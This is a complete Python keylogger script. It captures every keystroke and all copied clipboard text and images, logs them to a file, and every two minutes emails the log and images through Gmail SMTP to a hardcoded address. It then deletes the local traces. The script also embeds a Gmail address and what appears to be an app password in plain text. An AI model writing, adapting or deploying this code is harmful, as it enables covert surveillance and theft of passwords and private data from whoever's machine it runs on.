import pynput
import smtplib
import os
import pyperclip
import threading
 
from time import sleep
from timeit import default_timer as timer
from datetime import datetime
from datetime import date
from pynput.keyboard import Key, Listener, KeyCode, Controller
from PIL import ImageGrab, Image, ImageChops
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.application import MIMEApplication
from os.path import exists

count = 0 
keys = [] 
timer_start = 0 
 
stop_threads = False
email = "keyloggersomethingawesome@gmail.com"
password = "ryovivcmhuketouj"
 
def on_release(key):
    global stop_threads
   
    if key == Key.home:
        stop_threads = True
        clip_thread.join()
        
        return False
 
def on_press(key):
    global keys, count
   
    keys.append(key)
    count += 1
    
    if count >= 10:
        count = 0
        write_file(keys)
        keys = [] 
 
def key_logger():
    with Listener(on_press = on_press, on_release = on_release) as listener:
        listener.join()

def clip_logger():
    global keys, stop_threads
    
    prev_txt = pyperclip.paste()
 
    prev_img = Image.new('RGB', (60, 30), color = 'red')
    tmp_img = Image.new('RGB', (60, 30), color = 'blue')
   
    is_diff_image = ImageChops.difference(prev_img, tmp_img)
 
    while True:
        clip_txt = pyperclip.paste()
        try:
            grab_clip_img = ImageGrab.grabclipboard()
            clip_img = grab_clip_img.convert('RGB')
        except: 
            clip_img = prev_img
        is_diff_image = ImageChops.difference(prev_img, clip_img)
 
        
        if is_diff_image.getbbox():
            write_file(keys)
            keys = []
            write_file('   <an image was copied>\n')
            clip_img.save('to_send.jpg')
            send_image('to_send.jpg')
            os.remove('to_send.jpg')
            prev_img = clip_img
 
        elif prev_txt != clip_txt and clip_txt != '':
            
            write_file(keys)
            keys = []
            write_file('\n COPIED: ' + clip_txt + '\n')
            prev_txt = clip_txt
 
        if stop_threads:
            
            break
        sleep(0.1) 
 


def append_styling(key, f):
    k = str(key)
 
    if ord(getattr(key, 'char', '0')) <= 26:
        ascii_value = chr(96 + ord(getattr(key, 'char', '0')))
        f.write(' [+ {0}]'.format(ascii_value))
 
    elif k.find("Key") != -1:
        k = k.replace("Key.", "")
        f.write('\n [{0}]\n'.format(k))
 
    else:
        k = k.replace("'", "")
        f.write(k)
 
 

def write_file(keys):
    if exists("log.txt") == False:
        with open("log.txt", "w", encoding="utf-8") as f:
            for key in keys:
                append_styling(key, f)
    else:
        with open("log.txt", "a", encoding="utf-8") as f:
            for key in keys:
                append_styling(key, f)
 
def send_email(msg):
    
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(msg['From'], password)
    
    server.sendmail(msg['From'], msg['To'], msg.as_string())
   
    server.close()
 

def send_image(img_file_name):
    with open(img_file_name, 'rb') as f:
        img_data = f.read()
    
    dt = date.today().strftime("%b-%d-%Y")
    tme = datetime.now().strftime("%H:%M:%S")
    
    msg = MIMEMultipart()
    msg['Subject'] = 'Image copied on: {0}'.format(dt)
    msg['From'] = email
    msg['To'] = email
    
    body = MIMEText("Time of image sent = {0}".format(tme), 'html')
    
    image = MIMEImage(img_data, name=os.path.basename(img_file_name))
   
    msg.attach(image)
    msg.attach(body)
 
    send_email(msg)
 

def send_log():
    dt = date.today().strftime("%b-%d-%Y")
    tme = datetime.now().strftime("%H:%M:%S")
    
    msg = MIMEMultipart()
    msg['Subject'] = 'Log file on: {0}'.format(dt)
    msg['From'] = email
    msg['To'] = email
    body = MIMEText("Time of log file sent = {0}".format(tme), 'html')
    filename = "log.txt"
    attachment = MIMEText(open(filename).read())
    attachment.add_header('Content-Disposition', 'attachment', filename=filename)          
   
    msg.attach(attachment)
    msg.attach(body)
 
    send_email(msg)
 

def periodically_send_mail():
    global timer_start, keys
    timer_start = timer()
 
    while True:
        timer_end = timer()
        time_diff = timer_end - timer_start
        if stop_threads:
            break 
        elif time_diff >= 120 and exists("log.txt"):  
            write_file(keys)
            keys = []
            send_log()
            timer_start = timer_end
            os.remove("log.txt")
        sleep(0.2)
 
key_thread = threading.Thread(target=key_logger)
clip_thread = threading.Thread(target=clip_logger)
send_thread = threading.Thread(target=periodically_send_mail)

key_thread.start()
clip_thread.start()
send_thread.start()
 
while True:
    if stop_threads:
        write_file(keys)
        send_log()
        os.remove("log.txt")
        break
    sleep(0.2)

